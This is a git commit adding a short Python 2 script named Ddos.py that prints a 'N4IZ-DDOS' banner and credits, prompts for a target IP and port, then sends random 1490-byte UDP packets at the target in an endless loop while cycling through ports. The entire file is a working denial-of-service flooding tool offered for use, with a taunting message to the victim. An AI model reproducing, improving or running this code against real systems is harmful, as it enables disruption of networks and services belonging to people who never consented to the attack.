90a0859ad35bc040fa070a1f9302c99ef854eb95
N4IZ-EXE <86039735+N4IZ-EXE@users.noreply.github.com>
2022-06-04 21:49:23 +0600

    Add files via upload

---
+++ Ddos.py
@@ -0,0 +1,60 @@
+import time
+import socket
+import random
+import os
+import sys
+
+'''os.system("apt update")
+os.system("apt install python2")'''
+
+
+os.system("clear")
+
+
+
+from datetime import datetime
+now=datetime.now( )
+hour=now.hour
+minute=now.minute
+month=now.month
+year=now.year
+
+############
+sock=socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+bytes=random._urandom(1490)
+#############
+
+os.system("figlet N4IZ-DDOS")
+
+print("\033[1;93mNAFIZ AHMED")
+
+print("\033[1;95mFacebook:""\033[1;91mN4IZ TEAM ")
+
+print(""
+
+
+
+
+
+
+)
+
+
+'\033[1;92m'
+ip=raw_input("ENTER TARGET IP:")
+port=input("PORT:")
+
+print("FUCK YOUR SYSTEM")
+"\033[1;93m"
+
+
+sent = 0
+while True:
+     sock.sendto(bytes, (ip,port))
+     sent = sent + 1
+     port = port + 1
+     print "\033[1;91mSent %s packet to %s Target port:%s"%(sent,ip,port)
+     if port == 65534:
+       port = 1
+	
+
